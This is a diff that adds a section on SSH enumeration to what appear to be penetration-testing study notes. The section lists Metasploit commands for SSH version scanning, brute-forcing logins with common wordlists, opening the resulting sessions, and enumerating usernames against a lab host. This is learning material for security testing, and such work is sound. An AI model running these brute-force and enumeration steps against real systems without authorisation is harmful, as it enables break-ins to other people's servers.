@@ -366,3 +366,38 @@ MySQL is an open-source relational database management system based on SQL(Struc
 - `set USERNAME root`
 - `run`
 
+### SSH Enumeration
+SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet. It is typically used for remote access to servers and systems. SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.
+
+### Practical SSH Enumeration
+
+**SSH Service Version Enumeration**
+- `service postgresql start`
+- `msfconsole`
+- `workspace -a WEB_ENUM`
+- `ifconfig`
+- `setg RHOSTS 192.171.193.3`
+- `setg RHOST 192.171.193.3`
+- `search type:auxiliary name:ssh`
+- `use auxiliary/scanner/ssh/ssh_version`
+- `options`
+- `run`
+
+**SSH Bruteforce**
+- `search type:auxiliary name:ssh`
+- `use auxiliary/scanner/ssh/ssh_login`
+- `options`
+- `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
+- `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt`
+- `run` = when this module finds matching credentials, it will automatically establish a ssh session.
+- `sessions` to show the active sessions
+- `sessions 1` to connect with the session 1
+In our situation we were successfull, however when you can't fint matching credentials your can try to enumerate the user first:
+
+**SSH Enumerate Users**
+- `search type:auxiliary name:ssh`
+- `use auxiliary/scanner/ssh/ssh_enumusers`
+- `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
+- `set CHECK_FALSE false` disable that it checks for false positives (random username)
+- `run`
+
